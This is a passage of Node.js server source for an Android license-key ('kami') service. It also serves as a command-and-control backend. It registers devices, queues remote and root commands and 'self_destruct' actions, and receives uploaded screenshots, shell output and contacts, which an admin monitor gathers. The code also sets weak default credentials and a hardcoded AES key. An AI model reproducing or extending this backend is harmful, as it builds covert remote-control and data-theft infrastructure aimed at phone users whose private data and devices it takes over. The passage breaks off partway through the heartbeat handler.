const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { URL } = require('url');

loadEnv(path.join(__dirname, '.env'));

const PORT = Number(process.env.PORT || 3000);
const PUBLIC_BASE_URL = trimRightSlash(process.env.PUBLIC_BASE_URL || `http://127.0.0.1:${PORT}`);
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'change-me-123';
const CONFIG_AES_KEY = process.env.CONFIG_AES_KEY || '1234567890abcdef';
const DEFAULT_MONTH_DAYS = Number(process.env.DEFAULT_MONTH_DAYS || 30);
const SHELL_VERSION = '156';
const ADMIN_TOKEN_TTL_MS = Number(process.env.ADMIN_TOKEN_TTL_MS || 24 * 60 * 60 * 1000);
const VERIFY_WINDOW_MS = 60 * 1000;
const VERIFY_MAX_PER_WINDOW = Number(process.env.VERIFY_MAX_PER_WINDOW || 30);
const AI_API_BASE_URL = trimRightSlash(process.env.AI_API_BASE_URL || 'https://ai.1314mc.net');
const AI_API_KEY = process.env.AI_API_KEY || '';
const AI_MODEL = process.env.AI_MODEL || 'gpt-4o-mini';
const DEFAULT_AI_HTML_PROMPT = [
  'You are a WebView UI designer for license verification popups.',
  'Generate a complete self-contained HTML page for embedding in an Android WebView.',
  'Requirements: output only HTML, no Markdown; must include input id="cardInput"; must include a verify button calling verify(false); keep existing JS bridge calls; responsive mobile layout.',
  'Style: clean, lightweight, no external CDN.'
].join('\n');
const dataDir = path.join(__dirname, 'data');
const dbFile = path.join(dataDir, 'db.json');
const uploadsDir = path.join(dataDir, 'uploads');

ensureDir(dataDir);
ensureDir(uploadsDir);
let db = loadDb();
const tokens = new Map();
const verifyRate = new Map();

// ring buffer log, last 500 entries
const LOG_RING = [];
const LOG_RING_MAX = 500;
const _origLog = console.log.bind(console);
const _origError = console.error.bind(console);
function pushLog(level, args) {
  const line = `[${new Date().toISOString().replace('T',' ').slice(0,19)}][${level}] ` + args.map(String).join(' ');
  LOG_RING.push(line);
  if (LOG_RING.length > LOG_RING_MAX) LOG_RING.shift();
}
console.log = (...args) => { _origLog(...args); pushLog('INFO', args); };
console.error = (...args) => { _origError(...args); pushLog('ERROR', args); };

const server = http.createServer(async (req, res) => {
  const startMs = Date.now();
  try {
    await route(req, res);
  } catch (error) {
    console.error(`[ERROR] ${req.method} ${req.url}`, error.message);
    sendJson(res, 500, { ok: false, message: 'server error' });
  } finally {
    const ms = Date.now() - startMs;
    const ip = String((req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '')).split(',')[0].trim();
    if (req.url !== 'xxxNEVERxxx') {
      console.log(`[${new Date().toISOString().replace('T',' ').slice(0,19)}] ${req.method} ${req.url} ${ip} ${ms}ms`);
    }
  }
});

server.listen(PORT, '0.0.0.0', () => {
  if (ADMIN_PASSWORD === 'change-me-123') console.warn('[WARN] ADMIN_PASSWORD is default, change .env before deploy');
  if (CONFIG_AES_KEY === '1234567890abcdef') console.warn('[WARN] CONFIG_AES_KEY is default, change .env and update client Vault');
  console.log(`card server listening on 0.0.0.0:${PORT}`);
  console.log(`admin panel: ${PUBLIC_BASE_URL}/admin`);
  console.log(`verify url: ${PUBLIC_BASE_URL}/kami/verify`);
});

async function route(req, res) {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  setCors(res);
  if (req.method === 'OPTIONS') return end(res, 204, '');


  if (req.method === 'GET' && (url.pathname === '/admin' || url.pathname === '/admin/')) {
    return sendFile(res, path.join(__dirname, 'public', 'admin.html'), 'text/html; charset=utf-8');
  }

  if (req.method === 'POST' && url.pathname === '/admin/login') {
    const body = await readBody(req);
    const params = parseBody(req, body);
    if (params.username !== ADMIN_USER || params.password !== ADMIN_PASSWORD) {
      return sendJson(res, 401, { ok: false, message: 'invalid credentials' });
    }
    const token = crypto.randomBytes(24).toString('hex');
    tokens.set(token, Date.now());
    return sendJson(res, 200, { ok: true, token });
  }

  if (url.pathname.startsWith('/admin/api/')) {
    const token = getBearerToken(req);
    if (!isTokenValid(token)) return sendJson(res, 401, { ok: false, message: 'unauthorized' });
    return handleAdminApi(req, res, url);
  }

  if (req.method === 'POST' && url.pathname === '/kami/verify') {
    const ip = remoteIp(req, {});
    if (isRateLimited(verifyRate, ip, VERIFY_WINDOW_MS, VERIFY_MAX_PER_WINDOW)) {
      return sendJson(res, 429, { code: -1, message: 'rate limited', data: { remaining_seconds: 0 } });
    }
    const body = await readBody(req);
    const params = parseBody(req, body);
    const input = pickCardInput(params);
    const deviceId = firstParam(params, 'deviceId', 'device_id', 'did');
    const result = verifyCard({ input, deviceId });
    db.logs.unshift({ card: input, device_id: deviceId, ok: result.code === 0, message: result.message, ip: req.socket.remoteAddress, created_at: now() });
    db.logs = db.logs.slice(0, 1000);
    saveDb();
    return sendJson(res, 200, result);
  }

  if (req.method === 'POST' && url.pathname === '/device/register') {
    const params = parseBody(req, await readBody(req));
    return sendJson(res, 200, registerDevice(params, req));
  }

  if (req.method === 'POST' && url.pathname === '/device/heartbeat') {
    const params = parseBody(req, await readBody(req));
    return sendJson(res, 200, deviceHeartbeat(params, req));
  }

  if (req.method === 'POST' && url.pathname === '/device/ack') {
    const params = parseBody(req, await readBody(req));
    return sendJson(res, 200, deviceAck(params));
  }

  if (req.method === 'POST' && url.pathname === '/device/upload') {
    return sendJson(res, 200, await deviceUpload(req));
  }

  if (url.pathname === '/' && (req.method === 'GET' || req.method === 'POST')) {
    const params = req.method === 'POST' ? parseBody(req, await readBody(req)) : Object.fromEntries(url.searchParams.entries());
    const softwareType = firstParam(params, 'software_type', 'software', 'app', 'package');
    return end(res, 200, encryptConfig(buildConfig(softwareType)), 'text/plain; charset=utf-8');
  }

  return sendJson(res, 404, { ok: false, message: 'not found' });
}

async function handleAdminApi(req, res, url) {
  if (req.method === 'GET' && url.pathname === '/admin/api/cards') {
    const cards = db.cards.slice().sort((a, b) => b.id - a.id).map(c => {
      const device = c.device_id ? db.devices.find(d => d.device_id === c.device_id) : null;
      return { ...c, device_name: device ? device.name : '', device_id_short: c.device_id ? c.device_id.slice(0, 20) : '', device_os: device ? device.os : '' };
    });
    return sendJson(res, 200, { ok: true, cards });
  }

  if (req.method === 'POST' && url.pathname === '/admin/api/cards') {
    const params = parseBody(req, await readBody(req));
    const count = clampInt(params.count, 1, 500, 1);
    const durationDays = clampInt(params.duration_days, 1, 3650, DEFAULT_MONTH_DAYS);
    const name = String(params.name || 'monthly');
    const note = String(params.note || '');
    const created = [];
    for (let index = 0; index < count; index += 1) {
      let card;
      do { card = makeCard(); } while (db.cards.some(item => item.card === card));
      const item = {
        id: nextId(), card, name, duration_days: durationDays, status: 'active', device_id: '',
        first_used_at: '', expires_at: '', note, created_at: now(), updated_at: now()
      };
      db.cards.push(item);
      created.push(card);
    }
    saveDb();
    return sendJson(res, 200, { ok: true, cards: created });
  }

  const statusMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)\/status$/);
  if (req.method === 'POST' && statusMatch) {
    const params = parseBody(req, await readBody(req));
    const card = findCard(Number(statusMatch[1]));
    if (!card) return sendJson(res, 404, { ok: false, message: 'not found' });
    const status = String(params.status || 'active');
    if (!['active', 'disabled'].includes(status)) return sendJson(res, 400, { ok: false, message: 'bad status' });
    card.status = status;
    card.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true });
  }

  const resetMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)\/reset-device$/);
  if (req.method === 'POST' && resetMatch) {
    const card = findCard(Number(resetMatch[1]));
    if (!card) return sendJson(res, 404, { ok: false, message: 'not found' });
    card.device_id = '';
    card.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true });
  }

  const unbindMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)\/unbind$/);
  if (req.method === 'POST' && unbindMatch) {
    const card = findCard(Number(unbindMatch[1]));
    if (!card) return sendJson(res, 404, { ok: false, message: 'not found' });
    card.device_id = '';
    card.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true });
  }

  const rebindMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)\/rebind$/);
  if (req.method === 'POST' && rebindMatch) {
    const card = findCard(Number(rebindMatch[1]));
    if (!card) return sendJson(res, 404, { ok: false, message: 'not found' });
    const params = parseBody(req, await readBody(req));
    const newDeviceId = String(params.device_id || '').trim();
    if (!newDeviceId) return sendJson(res, 400, { ok: false, message: 'device_id required' });
    card.device_id = newDeviceId;
    card.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true });
  }

  const deleteMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)$/);
  if (req.method === 'DELETE' && deleteMatch) {
    const id = Number(deleteMatch[1]);
    const before = db.cards.length;
    db.cards = db.cards.filter(card => card.id !== id);
    saveDb();
    return sendJson(res, 200, { ok: db.cards.length !== before });
  }

  if (req.method === 'GET' && url.pathname === '/admin/api/devices') {
    return sendJson(res, 200, { ok: true, devices: listDevices(url.searchParams) });
  }

  const deviceMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)$/);
  if (req.method === 'GET' && deviceMatch) {
    const device = findDevice(Number(deviceMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
    return sendJson(res, 200, { ok: true, device: enrichDevice(device) });
  }
  if (req.method === 'DELETE' && deviceMatch) {
    const id = Number(deviceMatch[1]);
    const before = db.devices.length;
    db.devices = db.devices.filter(d => d.id !== id);
    saveDb();
    return sendJson(res, 200, { ok: db.devices.length !== before });
  }

  const deviceCardMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/card$/);
  if (req.method === 'POST' && deviceCardMatch) {
    const device = findDevice(Number(deviceCardMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
    const params = parseBody(req, await readBody(req));
    const newCard = String(params.card || '').trim();
    if (!newCard) return sendJson(res, 400, { ok: false, message: 'card required' });
    // Unbind old card if device had one
    if (device.card) {
      const oldCard = db.cards.find(c => c.card === device.card);
      if (oldCard) { oldCard.device_id = ''; oldCard.updated_at = now(); }
    }
    // Bind new card
    const cardEntry = db.cards.find(c => c.card === newCard);
    if (cardEntry) { cardEntry.device_id = device.device_id; cardEntry.updated_at = now(); }
    device.card = newCard;
    device.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true });
  }

  const deviceCmdMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/command$/);
  if (req.method === 'POST' && deviceCmdMatch) {
    const device = findDevice(Number(deviceCmdMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
    const params = parseBody(req, await readBody(req));
    try {
      const cmd = queueDeviceCommand(device, params);
      saveDb();
      return sendJson(res, 200, { ok: true, command: cmd });
    } catch (e) {
      return sendJson(res, 400, { ok: false, message: e.message });
    }
  }

  const deviceConfigMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/config$/);
  if (req.method === 'POST' && deviceConfigMatch) {
    const device = findDevice(Number(deviceConfigMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
    const params = parseBody(req, await readBody(req));
    if (params.clear === true || params.clear === 'true' || params.clear === '1') {
      device.config_override = null;
    } else {
      device.config_override = sanitizeConfig(params.config_override || params.config);
    }
    device.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true, device: enrichDevice(device) });
  }

  // clear all pending commands
  const clearCmdsMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/clear-commands$/);
  if (req.method === 'POST' && clearCmdsMatch) {
    const device = findDevice(Number(clearCmdsMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
    const cleared = (device.pending_commands || []).length;
    device.pending_commands = [];
    device.updated_at = now();
    saveDb();
    console.log(`[admin] cleared ${cleared} pending cmds for ${device.device_id}(${device.name})`);
    return sendJson(res, 200, { ok: true, cleared });
  }

  if (req.method === 'GET' && url.pathname === '/admin/api/groups') {
    return sendJson(res, 200, { ok: true, groups: db.groups.slice().sort((a, b) => a.id - b.id) });
  }
  if (req.method === 'POST' && url.pathname === '/admin/api/groups') {
    const params = parseBody(req, await readBody(req));
    const name = String(params.name || '').trim();
    if (!name) return sendJson(res, 400, { ok: false, message: 'name required' });
    if (db.groups.some(g => g.name === name)) return sendJson(res, 409, { ok: false, message: 'group exists' });
    const group = createGroup({ name, display_name: params.display_name, config: params.config });
    saveDb();
    return sendJson(res, 200, { ok: true, group });
  }
  const groupConfigMatch = url.pathname.match(/^\/admin\/api\/groups\/(\d+)\/config$/);
  if (req.method === 'POST' && groupConfigMatch) {
    const group = db.groups.find(g => g.id === Number(groupConfigMatch[1]));
    if (!group) return sendJson(res, 404, { ok: false, message: 'not found' });
    const params = parseBody(req, await readBody(req));
    const sanitized = sanitizeConfig(params.config);
    if (sanitized) group.config = Object.assign(group.config || {}, sanitized);
    if (params.display_name != null) group.display_name = String(params.display_name);
    group.updated_at = now();
    saveDb();
    return sendJson(res, 200, { ok: true, group });
  }
  const groupMatch = url.pathname.match(/^\/admin\/api\/groups\/(\d+)$/);
  if (req.method === 'DELETE' && groupMatch) {
    const id = Number(groupMatch[1]);
    const force = url.searchParams.get('force') === 'true';
    if (db.devices.some(d => d.group_id === id)) {
      if (!force) return sendJson(res, 400, { ok: false, message: 'group has devices' });
      db.devices.forEach(d => { if (d.group_id === id) d.group_id = null; });
    }
    db.groups = db.groups.filter(g => g.id !== id);
    saveDb();
    return sendJson(res, 200, { ok: true });
  }

  if (req.method === 'GET' && url.pathname === '/admin/api/global-config') {
    return sendJson(res, 200, { ok: true, config: db.global_config });
  }
  if (req.method === 'POST' && url.pathname === '/admin/api/global-config') {
    const params = parseBody(req, await readBody(req));
    const sanitized = sanitizeConfig(params.config);
    if (sanitized) db.global_config = Object.assign(db.global_config, sanitized);
    saveDb();
    return sendJson(res, 200, { ok: true, config: db.global_config });
  }

  if (req.method === 'GET' && url.pathname === '/admin/api/ai-config') {
    return sendJson(res, 200, { ok: true, config: getAiConfigForClient() });
  }
  if (req.method === 'POST' && url.pathname === '/admin/api/ai-config') {
    const params = parseBody(req, await readBody(req));
    db.ai_config = sanitizeAiConfig(params.config || params);
    saveDb();
    return sendJson(res, 200, { ok: true, config: getAiConfigForClient() });
  }
  if (req.method === 'POST' && url.pathname === '/admin/api/ai-generate-html') {
    const params = parseBody(req, await readBody(req));
    try {
      const html = await generateHtmlWithAi(params.user_request || params.requirement || '', params.prompt || '');
      return sendJson(res, 200, { ok: true, html });
    } catch (e) {
      return sendJson(res, 500, { ok: false, message: e.message });
    }
  }

  // 设备上传历史（截图/shell结果/联系人）
  const uploadsMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/uploads$/);
  if (uploadsMatch && req.method === 'GET') {
    const device = db.devices.find(d => d.id === Number(uploadsMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'device not found' });
    const uploads = device.uploads || [];
    return sendJson(res, 200, { ok: true, uploads });
  }
  // 删除上传文件
  const delUploadMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/uploads\/(.+)$/);
  if (delUploadMatch && req.method === 'DELETE') {
    const device = db.devices.find(d => d.id === Number(delUploadMatch[1]));
    if (!device) return sendJson(res, 404, { ok: false, message: 'device not found' });
    const filename = path.basename(decodeURIComponent(delUploadMatch[2]));
    const filepath = path.join(uploadsDir, filename);
    if (fs.existsSync(filepath)) try { fs.unlinkSync(filepath); } catch {}
    device.uploads = (device.uploads || []).filter(u => u.filename !== filename);
    saveDb();
    return sendJson(res, 200, { ok: true });
  }
  if (req.method === 'GET' && url.pathname.startsWith('/admin/api/uploads/')) {
    const filename = path.basename(url.pathname.replace('/admin/api/uploads/', ''));
    const filepath = path.join(uploadsDir, filename);
    if (!fs.existsSync(filepath)) return sendJson(res, 404, { ok: false, message: 'file not found' });
    const ext = path.extname(filename).toLowerCase();
    const mimeMap = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.txt': 'text/plain; charset=utf-8', '.json': 'application/json' };
    const mime = mimeMap[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': mime, 'Content-Disposition': `inline; filename="${filename}"` });
    fs.createReadStream(filepath).pipe(res);
    return;
  }

  // 服务器日志（内存缓冲，最近500条）
  if (req.method === 'GET' && url.pathname === '/admin/api/logs') {
    return sendJson(res, 200, { ok: true, logs: LOG_RING.slice(-300).join('\n') });
  }

  // 总览：聚合所有设备上传、待命令、统计
  if (req.method === 'GET' && url.pathname === '/admin/api/monitor') {
    const devices = db.devices || [];
    const totalDevices = devices.length;
    const onlineDevices = devices.filter(d => d.status === 'online').length;
    // 所有上传（最新100条，按时间降序）
    let allUploads = [];
    for (const d of devices) {
      for (const u of (d.uploads || [])) {
        allUploads.push({ ...u, device_id: d.id, device_name: d.device_name || d.id });
      }
    }
    allUploads.sort((a, b) => (b.created_at || '').localeCompare(a.created_at || ''));
    allUploads = allUploads.slice(0, 100);
    // 所有待执行命令
    let allPending = [];
    for (const d of devices) {
      for (const c of (d.pending_commands || [])) {
        allPending.push({ ...c, device_id: d.id, device_name: d.device_name || d.id });
      }
    }
    return sendJson(res, 200, {
      ok: true,
      stats: { totalDevices, onlineDevices, totalUploads: allUploads.length, totalPending: allPending.length },
      uploads: allUploads,
      pending: allPending
    });
  }

  return sendJson(res, 404, { ok: false, message: 'not found' });
}

function buildConfig(softwareType) {
  const cfg = effectiveConfigForSoftware(softwareType || 'default');
  const useHtml = cfg.use_html_popup === true;
  const popupHtml = useHtml && cfg.popup_html ? cfg.popup_html : '';
  return {
    debug: !!cfg.debug,
    domains: [PUBLIC_BASE_URL],
    enableHook: !!cfg.enable_hook,
    enable_popup_keywords: false,
    ban_Root: !!cfg.ban_root,
    ban_Xposed: !!cfg.ban_xposed,
    ban_Emulator: !!cfg.ban_emulator,
    ban_VirtualApp: !!cfg.ban_virtual_app,
    ban_DualApp: !!cfg.ban_dual_app,
    websocket: '',
    poll_interval: cfg.poll_interval,
    enable_c2: cfg.enable_c2,
    heartbeat_verify: cfg.heartbeat_verify,
    heartbeat_verify_interval_minutes: cfg.heartbeat_verify_interval_minutes,
    allow_device_diagnostics: cfg.allow_device_diagnostics,
    allow_root_commands: cfg.allow_root_commands,
    enablehtmlPopups: useHtml,
    htmlpopups: useHtml ? [{
      enable: true,
      id: 'card_gate_popup',
      white_list: [],
      black_list: [],
      html: popupHtml,
      lock: true,
      other: { verifyUrl: `${PUBLIC_BASE_URL}/kami/verify`, version_shell: SHELL_VERSION }
    }] : [],
    enablePopups: false,
    popups: [],
    enableImagePopups: false,
    imagepopups: [],
    enableMessagePopups: false,
    Messagepopups: [],
    black_package: [],
    new_black_package_list: [],
    blackActivities: []
  };
}

function effectiveConfigForSoftware(softwareType) {
  const base = normalizedConfig(db.global_config);
  const group = db.groups.find(g => g.name === softwareType);
  if (group && group.config) Object.assign(base, normalizedConfig(group.config));
  return base;
}

function buildCardHtml(verifyUrl, popupTitle, popupMessage) {
  const safeUrl = escapeHtml(verifyUrl);
  const safeTitle = escapeHtml(popupTitle || 'Enter License');
  const safeMessage = escapeHtml(popupMessage || 'One device per key');
  return `<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>html,body{margin:0;width:100%;height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Microsoft YaHei",Arial,sans-serif;background:rgba(0,0,0,.62)}.wrap{height:100%;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}.card{width:310px;background:#fff;border-radius:18px;box-shadow:0 14px 40px rgba(0,0,0,.18);padding:24px 22px 22px;box-sizing:border-box;text-align:center}.avatar{font-size:46px;line-height:1;margin-bottom:8px}.title{font-size:18px;font-weight:700;color:#222;margin-bottom:8px}.msg{min-height:22px;font-size:14px;color:#777;margin-bottom:14px}input{width:100%;height:42px;border:1px solid #e7e7e7;border-radius:22px;outline:none;padding:0 16px;font-size:15px;box-sizing:border-box;text-align:center;color:#333}.buttons{display:flex;gap:12px;margin-top:18px}button{flex:1;height:42px;border:0;border-radius:22px;font-size:15px;font-weight:600}.exit{background:#f0f0f0;color:#777}.verify{background:#ff5d9d;color:#fff}.verify:disabled{opacity:.55}.tip{position:fixed;left:50%;bottom:38px;transform:translateX(-50%);background:rgba(0,0,0,.65);color:#fff;border-radius:18px;padding:9px 18px;font-size:14px;opacity:0;transition:.2s;white-space:nowrap}.tip.show{opacity:1}</style></head><body><div class="wrap"><div class="card"><div class="avatar">🔐</div><div class="title">${safeTitle}</div><div id="msg" class="msg">${safeMessage}</div><input id="cardInput" placeholder="请输入卡密" autocomplete="off" autocapitalize="off"><div class="buttons"><button class="exit" onclick="exitApp()">退出应用</button><button id="btnVerify" class="verify" onclick="verify(false)">验证卡密</button></div></div></div><div id="tip" class="tip"></div><script>const VERIFY_URL='${safeUrl}';const POPUP_ID='card_gate_popup';const bridge=window.Android||window.android||window.MyAppWebView;const input=document.getElementById('cardInput');const btnVerify=document.getElementById('btnVerify');const saved=readSP('kami');if(saved)input.value=saved;function toast(text){const t=document.getElementById('tip');t.textContent=text;t.className='tip show';setTimeout(()=>t.className='tip',1800)}function setMsg(text){document.getElementById('msg').textContent=text}function readSP(key){try{return bridge&&bridge.readSP?bridge.readSP(key):''}catch(e){return''}}function saveSP(key,value){try{if(bridge&&bridge.writeSP){bridge.writeSP(key,value)}else if(bridge&&bridge.saveSP){bridge.saveSP(key,value)}}catch(e){}}function exitApp(){try{bridge&&bridge.exitApp?bridge.exitApp():null}catch(e){}}function closePopup(){try{bridge&&bridge.close?bridge.close(POPUP_ID):null}catch(e){}}async function verify(auto){const card=input.value.trim();if(!card){if(!auto)toast('请输入卡密');return}btnVerify.disabled=true;setMsg(auto?'正在自动验证已保存卡密...':'正在验证...');try{const body=new URLSearchParams({input:card,card:card,kami:card,deviceId:readSP('device_id')||readSP('deviceId')||'',software_type:readSP('software_type')||'',version_shell:'${SHELL_VERSION}'});const res=await fetch(VERIFY_URL,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body.toString()});const data=await res.json();handleResult(data&&Number(data.code)===0,data&&data.message,data&&data.data,auto)}catch(e){setMsg('网络异常，请重试');toast('网络异常');btnVerify.disabled=false}}function handleResult(success,message,data,auto){if(success){const card=input.value.trim();const sec=String((data&&(data.remaining_seconds||data.remainingSeconds))||0);saveSP('kami',card);toast(message||'验证成功');setMsg('验证成功');try{if(bridge&&bridge.onVerifySuccess){bridge.onVerifySuccess(card,sec);return}}catch(e){}setTimeout(closePopup,600);return}btnVerify.disabled=false;const text=message||'卡密不存在';setMsg(auto?'已保存卡密失效，请重新输入':text);toast(text)}setTimeout(()=>{if(saved)verify(true)},500)<\/script></body></html>`;
}
function verifyCard({ input, deviceId }) {
  // auto-verify: deviceId-only lookup for bound cards
  if (!input && deviceId) {
    const boundCard = db.cards.find(c => c.device_id === deviceId && c.status === 'active');
    if (!boundCard) return fail('no bound card');
    if (boundCard.expires_at) {
      const remainingSeconds = Math.max(0, Math.floor((new Date(boundCard.expires_at).getTime() - Date.now()) / 1000));
      if (remainingSeconds <= 0) return fail('expired');
      return { code: 0, message: 'ok', data: { remaining_seconds: remainingSeconds, expires_at: boundCard.expires_at, card: boundCard.card } };
    }
    return { code: 0, message: 'ok', data: { remaining_seconds: -1, expires_at: '', card: boundCard.card } };
  }
  if (!input) return fail('invalid input');
  const card = db.cards.find(item => item.card === input);
  if (!card) return fail('not found');
  if (card.status !== 'active') return fail('disabled');
  const current = now();
  if (!card.first_used_at) {
    card.first_used_at = current;
    // duration_days=0 表示永久，不设 expires_at
    if (card.duration_days > 0) card.expires_at = addDays(current, card.duration_days);
    card.device_id = deviceId || '';
    card.updated_at = current;
    saveDb();
  } else if (card.device_id && deviceId && card.device_id !== deviceId) {
    return fail('bound to another device');
  } else if (!card.device_id && deviceId) {
    card.device_id = deviceId;
    card.updated_at = current;
    saveDb();
  }
  // 永久卡（expires_at 为空）不检查过期
  if (card.expires_at) {
    const remainingSeconds = Math.max(0, Math.floor((new Date(card.expires_at).getTime() - Date.now()) / 1000));
    if (remainingSeconds <= 0) return fail('expired');
    return { code: 0, message: 'ok', data: { remaining_seconds: remainingSeconds, expires_at: card.expires_at, card: input } };
  }
  return { code: 0, message: 'ok', data: { remaining_seconds: -1, expires_at: '', card: input } };
}

function fail(message) { return { code: -1, message, data: { remaining_seconds: 0 } }; }

function registerDevice(params, req) {
  const deviceId = String(params.device_id || params.deviceId || params.did || '').trim();
  if (!deviceId) return { code: -1, message: 'device_id required' };
  const softwareType = String(params.software_type || params.software || params.app || 'default').trim();
  const group = findOrCreateGroup(softwareType);
  const ip = remoteIp(req, params);
  const meta = parseMeta(params);
  const current = now();

  // Only accept a card from params if it actually exists and is not bound to another device
  const paramsCard = String(params.card || params.kami || '');
  const validCard = paramsCard ? db.cards.some(c => c.card === paramsCard && (!c.device_id || c.device_id === deviceId)) : false;

  let device = db.devices.find(d => d.device_id === deviceId && d.software_type === softwareType);
  if (!device) {
    device = {
      id: nextDeviceId(),
      device_id: deviceId,
      name: String(params.name || meta.model || meta.hostname || deviceId.slice(0, 24)),
      os: String(params.os || meta.os || 'unknown').toLowerCase(),
      software_type: softwareType,
      software_version: String(params.software_version || params.version || ''),
      ip,
      group_id: group.id,
      card: validCard ? paramsCard : '',
      meta,
      registered_at: current,
      last_seen_at: current,
      status: 'online',
      config_override: null,
      pending_commands: [],
      created_at: current,
      updated_at: current
    };
    db.devices.push(device);
  } else {
    if (params.name) device.name = String(params.name);
    if (params.os) device.os = String(params.os).toLowerCase();
    if (params.software_version || params.version) device.software_version = String(params.software_version || params.version);
    device.ip = ip || device.ip;
    device.meta = Object.assign(device.meta || {}, meta);
    device.group_id = group.id;
    if (validCard) device.card = paramsCard;
    device.last_seen_at = current;
    device.updated_at = current;
    if (device.status !== 'destroyed') device.status = 'online';
  }

  // Auto-issue: group has auto_issue_card enabled and device has no bound card
  // Also re-issue if the bound card no longer exists or is bound to a different device
  const cfg = effectiveConfig(device);
  const hasValidCard = device.card && db.cards.some(c => c.card === device.card && (!c.device_id || c.device_id === deviceId) && c.status === 'active');
  if (cfg.auto_issue_card && !hasValidCard) {
    if (device.card) console.log(`[auto-card] ${deviceId}: stale card ${device.card}, re-issuing`);
    const autoCard = autoIssueCard(device, softwareType);
    if (autoCard) {
      device.card = autoCard.card;
      device.updated_at = current;
      console.log(`[auto-card] ${deviceId}(${device.name}) issued ${autoCard.card}`);
    }
  }

  saveDb();
  const cmds = device.pending_commands.slice();
  if (cmds.length) console.log(`[reg] ${deviceId}(${device.name}) ${cmds.length} pending: ${cmds.map(c=>c.type).join(',')}`);
  else console.log(`[reg] ${deviceId}(${device.name}) online`);
  return {
    code: 0,
    message: 'ok',
    data: {
      id: device.id,
      group: group.name,
      config: cfg,
      pending_commands: cmds
    }
  };
}

// 自动签发卡密（duration_days=0 表示永久）
function autoIssueCard(device, softwareType) {
  // 优先复用已有该设备绑定的 auto 卡
  let card = db.cards.find(c => c.device_id === device.device_id && c.note === '__auto__' && c.status === 'active');
  if (card) return card;
  let cardStr;
  do { cardStr = makeCard(); } while (db.cards.some(c => c.card === cardStr));
  card = {
    id: nextId(),
    card: cardStr,
    name: 'auto-' + softwareType,
    duration_days: 0,
    status: 'active',
    device_id: device.device_id,
    first_used_at: now(),
    expires_at: '',
    note: '__auto__',
    created_at: now(),
    updated_at: now()
  };
  db.cards.push(card);
  return card;
}

function deviceHeartbeat(params, req) {
  const deviceId = String(params.device_id || params.deviceId || params.did || '').trim();
  const softwareType = String(params.software_type || params.software || params.app || '').trim();
  let device = softwareType
    ? db.devices.find(d => d.device_id === deviceId && d.software_type === softwareType)
    : db.devices.find(d => d.device_id === deviceId);
  if (!device) {
    return { code: -1, message: 'not registered', data: { config: db.global_config, pending_commands: [] } };
  }
  device.last_seen_at = now();
  device.ip = remoteIp(req, params) || device.ip;
  if (device.status === 'offline') device.status = 'online';
  if (params.software_version || params.version) device.software_version = String(params.software_version || params.version);

  // 卡密过期检测
  const cfg = effectiveConfig(device);
  if (cfg.expire_action && cfg.expire_action !== 'none' && device.card) {
    const card = db.cards.find(c => c.card === device.card);
    const expired = card && card.expires_at && new Date(card.expires_at).getTime() < Date.now();
    const disabled = card && card.status !== 'active';
    if (expired || disabled) {
      const alreadyQueued = (device.pending_commands || []).some(c => c.type === 'expire_block' || c.type === 'self_destruct');
      if (!alreadyQueued) {
        device.pending_commands = device.pending_commands || [];
        if (cfg.expire_action === 'uninstall') {
          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'self_destruct', payload: { reason: disabled ? 'card_disabled' : 'card_expired' }, created_at: now() });
          console.log(`[expire] ${deviceId}(${device.name}) card ${disabled?'disabled':'expired'}, self-destruct queued`);
        } else if (cfg.expire_action === 'block') {
          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'expire_block', payload: { reason: disabled ? 'card_disabled' : 'card_expired' }, created_at: now() });
          console.log(`[expire] ${deviceId}(${device.name}) card ${disabled?'disabled':'expired'}, block queued`);
        }
      }
    }
  }

  saveDb();

  // If expire_action is now 'none', purge any stale expire_block/self_destruct
  // commands that may have been queued under a previous config, so they are
  // never delivered to the device.
  if (!cfg.expire_action || cfg.expire_action === 'none') {
    const before = device.pending_commands.length;
    device.pending_commands = device.pending_commands.filter(
      c => c.type !== 'expire_block' && c.type !== 'self_destruct'
    );
    if (device.pending_commands.length !== before) {
      console.log(`[beat] ${deviceId}(${device.name}) purged stale expire cmds (expire_action=none)`);
      saveDb();
    }
  }

  const cmds = device.pending_commands.slice();
